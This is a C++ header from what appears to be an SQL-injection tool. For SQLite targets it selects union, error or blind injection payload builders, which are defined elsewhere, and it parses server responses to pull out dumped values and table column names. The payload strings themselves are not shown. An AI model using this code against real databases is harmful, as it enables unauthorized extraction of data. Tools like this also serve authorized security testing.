#ifndef SQLI_SQLITE
#define SQLI_SQLITE

#define UNION 1
#define ERROR 2
#define BLIND 3

#include "../mysql/mysql.hpp"
#include "union_based.hpp"

struct sqli_sqlite
{
        inline static const str_vector excluded = {
            "sqlite_sequence",
        };

        static std::string payload(
            sptr_vector& config,
            uint8 method_type,
            uint8 value_type)
        {
                switch (method_type)
                {
                case UNION:
                        return sqlite_union_based::payload(config, value_type);
                case ERROR:
                        return mysql_error_based::payload(config, value_type);
                case BLIND:
                        return mysql_blind_based::payload(config, value_type);
                default:
                        return std::string();
                }
        };

        static str_vector parser(
            const std::string& response,
            sptr_vector& config,
            const uint8& method_type,
            const uint8& value_type)
        {
                Json::Value entries;
                std::string errors;
                Json::CharReaderBuilder builder;
                std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
                if (!reader->parse(
                        response.c_str(),
                        response.c_str() + response.size(),
                        &entries, &errors))
                {
                        std::cerr << "[ ERROR ] Could not parse server response."
                                  << std::endl;
                        return str_vector();
                }
                if (value_type == COLUMNS)
                        return col_parser(response, entries);

                str_vector values;
                for (const auto& member : entries.getMemberNames())
                {
                        if (!entries[member].isArray())
                                continue;
                        if (entries[member].empty())
                                return str_vector();

                        for (const auto& array : entries[member])
                        {
                                if (!(array.isArray() && !array.empty()))
                                        continue;
                                values.push_back(
                                    array[array.size() - 1].asString());
                        }
                }
                return values;
        }

        static str_vector col_parser(
            const std::string& response,
            Json::Value& entries)
        {
                str_vector values;
                std::string schema;
                size_t start;
                size_t end;
                std::string str;
                std::stringstream ss;
                std::string token;
                for (const auto& member : entries.getMemberNames())
                {
                        if (!entries[member].isArray())
                                continue;
                        if (entries[member].empty())
                        {
                                values.push_back(std::string());
                                continue;
                        }
                        for (const auto& array : entries[member])
                        {
                                if (!(array.isArray() && !array.empty()))
                                        continue;
                                try
                                {
                                        schema = array[array.size() - 1].asString();
                                        break;
                                }
                                catch (const std::exception& e)
                                {
                                        return values;
                                }
                        }
                        start = schema.find('(');
                        end = schema.find(')');
                        if (start == std::string::npos || end == std::string::npos)
                                return values;

                        str = schema.substr(start + 1, end - start - 1);
                        ss.str(str);
                        token.clear();
                        while (std::getline(ss, token, ','))
                        {
                                token.erase(
                                    token.begin(),
                                    std::find_if(
                                        token.begin(),
                                        token.end(),
                                        [](unsigned char ch)
                                        { return !std::isspace(ch); }));
                                token.erase(
                                    std::find_if(
                                        token.rbegin(),
                                        token.rend(),
                                        [](unsigned char ch)
                                        { return !std::isspace(ch); })
                                        .base(),
                                    token.end());

                                size_t delimiter = token.find(' ');
                                if (delimiter != std::string::npos)
                                {
                                        std::string name = token.substr(
                                            0, delimiter);
                                        values.push_back(name);
                                }
                        }
                        return values;
                }
                return values;
        };
};
#endif
